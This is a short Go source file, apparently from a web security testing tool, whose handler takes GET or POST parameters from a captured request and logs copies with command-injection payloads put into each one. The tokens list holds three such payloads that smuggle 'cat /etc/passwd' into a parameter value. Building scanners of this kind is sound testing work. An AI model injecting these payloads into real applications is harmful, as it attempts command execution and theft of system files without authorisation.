package repeatReqHandlers

import (
	"net/http"
	"strings"

	"github.com/sirupsen/logrus"
)

var tokens = []string{
	";cat /etc/passwd;",
	"|cat /etc/passwd|",
	"`cat /etc/passwd`",
}

func TryVulnerabilities(respWriter http.ResponseWriter, request *http.Request) {
	req := getReqFromParam(respWriter, request)
	// if req.Request[:3] == "GET" {

	// } else if req.Request[:4] == "POST" {
	logrus.Debug("Trying POST request vulnerability")
	var params []Param
	if req.Request[:3] == "GET" {
		params = findGETParams(req.Request)
	} else if req.Request[:4] == "POST" {
		params = findPOSTParams(req.Request)
	}

	for _, param := range params {
		for _, token := range tokens {
			logrus.Info(strings.Replace(req.Request, param.serialize(), param.fakeReplaceValue(token), 1))
		}
	}
}
